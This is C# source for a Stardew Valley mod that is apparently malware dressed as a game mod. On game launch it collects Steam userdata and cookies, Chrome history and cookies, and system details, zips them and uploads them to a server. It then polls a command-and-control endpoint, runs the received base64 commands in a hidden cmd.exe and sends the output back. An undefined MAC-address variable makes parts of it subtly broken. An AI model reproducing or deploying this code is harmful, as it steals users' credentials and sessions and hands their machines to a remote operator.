using StardewModdingAPI;
using StardewModdingAPI.Events;
using System.Diagnostics;
using System.IO.Compression;
using System.Net.Http.Headers;
using System.Text.Json;
using System.Text;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.IO;

public static class Globals
{
    public const String API_URL = "";
}


namespace SMAPIAbuse
{
    internal sealed class ModEntry : Mod
    {
        static string Hayloft_Path = Environment.GetEnvironmentVariable("TMP") + "\\Hayloft";  
        private static string Base64Encode(string plainText) { var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText); return System.Convert.ToBase64String(plainTextBytes);}
        public static string Base64Decode(string base64EncodedData) { var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData); return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);}

        private void Create_Hayloft(){
            if (!Directory.Exists(Hayloft_Path))
            {
                Directory.CreateDirectory(Hayloft_Path);
            }
            else
            {
                foreach (string directory in Directory.GetDirectories(Hayloft_Path))
                {Directory.Delete(directory);}
                try
                {Directory.Delete(Hayloft_Path, true);}
                catch (IOException)
                {Directory.Delete(Hayloft_Path, true);}
                catch (UnauthorizedAccessException)
                {Directory.Delete(Hayloft_Path, true);}
                Directory.CreateDirectory(Hayloft_Path);
            }
        }
        
        
        private void Scythe_Harvest(string Path, string Name)
        {
            if (Path.EndsWith("\\"))
            {
                if (Directory.Exists(Path)){
                    ZipFile.CreateFromDirectory(Path, Hayloft_Path + "\\" + Name + ".zip");
                }
            }
            else { 
                if (File.Exists(Path))
                { 
                    File.Copy(Path, Hayloft_Path + "\\" + Name);
                }
            }
        }
        
        private void Harvest_Steam()
        {
            string Userdata_Path = Environment.GetEnvironmentVariable("ProgramFiles(x86)") + "\\Steam\\userdata\\";
            string Cookie_Path = Environment.GetEnvironmentVariable("ProgramFiles(x86)") + "\\Steam\\htmlcache\\Network\\Cookies";
            Scythe_Harvest(Userdata_Path, "Steam_userdata");
            Scythe_Harvest(Cookie_Path, "Steam_Cookie");
        }
        private void Harvest_Chrome()
        {
            string Bookmarks = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Bookmarks";
            string History = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\History";
            string Cookies = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Network\\Cookies";
            Scythe_Harvest(Bookmarks, "Chrome_Bookmarks");
            Scythe_Harvest(History, "Chrome_History");
            Scythe_Harvest(Cookies, "Chrome_Cookies");
        }
        private void Harvest_Firefox()
        {
            if (Directory.Exists(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles"))
            {
                foreach (string Subdirectory in Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles"))
                {
                    if (Subdirectory.Contains("default-release"))
                    {
                        string Cookies = Subdirectory + "\\cookies.sqlite";
                        string History_Bookmarks = Subdirectory + "\\places.sqlite";
                        Scythe_Harvest(History_Bookmarks, "Firefox_History_Bookmarks");
                        Scythe_Harvest(Cookies, "Firefox_Cookies");
                    }
                }
            }

        }
        private void Harvest_System_Information()
        {
            var IPs = NetworkInterface.GetAllNetworkInterfaces().Select(i => i.GetIPProperties().UnicastAddresses).SelectMany(u => u).Where(u => u.Address.AddressFamily == AddressFamily.InterNetwork).Select(i => i.Address);
            string IP_Text = "";
            foreach (var ip in IPs){IP_Text += ip.ToString()+" "+Environment.NewLine;}
            string OS_Information = Environment.OSVersion.ToString();
            string OS_Version = Environment.Version.ToString();
            string Username = Environment.UserName.ToString();
            string Information_String = $"OS Information: {OS_Information}\nOS Version: {OS_Version}\nUsername: {Username}\nIP's: {IP_Text}\nMac Address: {System_Mac_Address}";
            File.WriteAllText(Hayloft_Path+"\\System_Information.txt", Information_String);
        }


        async private void Hayloft_Sell()
        {
            if (!File.Exists(Environment.GetEnvironmentVariable("TMP") + "\\Haybale.zip")) { 
                ZipFile.CreateFromDirectory(Hayloft_Path, Environment.GetEnvironmentVariable("TMP") + "\\Haybale.zip"); 
            }
            using (HttpClient client = new HttpClient())
            {
                using (MultipartFormDataContent content = new MultipartFormDataContent())
                {
                    using (FileStream fs = File.OpenRead(Environment.GetEnvironmentVariable("TMP") + "\\Haybale.zip"))
                    {
                        StreamContent fileContent = new StreamContent(fs);
                        fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                        content.Add(fileContent, "Collected_Haybale", Path.GetFileName(Environment.GetEnvironmentVariable("TMP") + "\\Haybale.zip"));
                        await client.PostAsync(Globals.API_URL + "/pasture", content);
                    }
                }
            }
        }

        public override void Entry(IModHelper helper)
        {
            helper.Events.GameLoop.GameLaunched += this.OnGameLaunched;
            helper.Events.GameLoop.TimeChanged += this.OnTimeChange;

        }

        private void OnGameLaunched(object? sender, GameLaunchedEventArgs e)
        {
            Environment.SetEnvironmentVariable("ctoken", "null");
            Create_Hayloft();
            Harvest_Steam();
            Harvest_Chrome();
            Harvest_System_Information();
            Hayloft_Sell();
            
        }

        private void OnTimeChange(object? sender, EventArgs e)
        {
            C2_Web_Request();
        }

        



        private string Crop_Control_Command(string Command_To_Run, string Command_Token)
        {
            Environment.SetEnvironmentVariable("ctoken", Command_Token);
            var Command_Process = new Process();
            Command_Process.StartInfo.FileName = "cmd.exe";
            Command_Process.StartInfo.Arguments = @"/c " + Base64Decode(Command_To_Run);
            Command_Process.StartInfo.CreateNoWindow = true;
            Command_Process.StartInfo.RedirectStandardError = true;
            Command_Process.StartInfo.RedirectStandardOutput = true;
            Command_Process.StartInfo.RedirectStandardInput = false;
            StringBuilder outputBuilder = new StringBuilder();
            StringBuilder errorBuilder = new StringBuilder();
            Command_Process.OutputDataReceived += (a, b) => { if (b.Data != null) { outputBuilder.AppendLine(b.Data); } };
            Command_Process.ErrorDataReceived += (a, b) => { if (b.Data != null) { errorBuilder.AppendLine(b.Data); } };
            Command_Process.Start();
            Command_Process.BeginErrorReadLine();
            Command_Process.BeginOutputReadLine();
            Command_Process.WaitForExit();
            return outputBuilder.ToString() + errorBuilder.ToString();
        }
        
        async private void C2_Web_Request()
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage Response = await client.GetAsync(Globals.API_URL+"/smapi/c2/get");
                    Response.EnsureSuccessStatusCode();
                    string Response_Body = await Response.Content.ReadAsStringAsync();
                    using (JsonDocument JSON_Data = JsonDocument.Parse(Response_Body))
                    {
                        JSON_Data.RootElement.TryGetProperty("token", out JsonElement C2_Token_Response);
                        JSON_Data.RootElement.TryGetProperty("command", out JsonElement C2_Command);
                        if (Environment.GetEnvironmentVariable("ctoken") != C2_Token_Response.ToString())
                        {
                            string Crop_Response = Crop_Control_Command(C2_Command.ToString(), C2_Token_Response.ToString());
                            Crop_Harvest(Base64Encode(Crop_Response));
                        }
                    }
                }
                catch (HttpRequestException e) { Console.WriteLine("\nException Caught!"); Console.WriteLine("Message :{0} ", e.Message); }
                catch (JsonException e) { Console.WriteLine("\nJSON Parsing Exception Caught!"); Console.WriteLine("Message :{0} ", e.Message); }
            }
        }


        async private void Crop_Harvest(string ExfiledData)
        {

            string url = Globals.API_URL+"/smapi/c2/exfil";
            string json = "{\"data\":\"" + ExfiledData + "\"}";

            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync(url, content);
            }
        }


    }
}
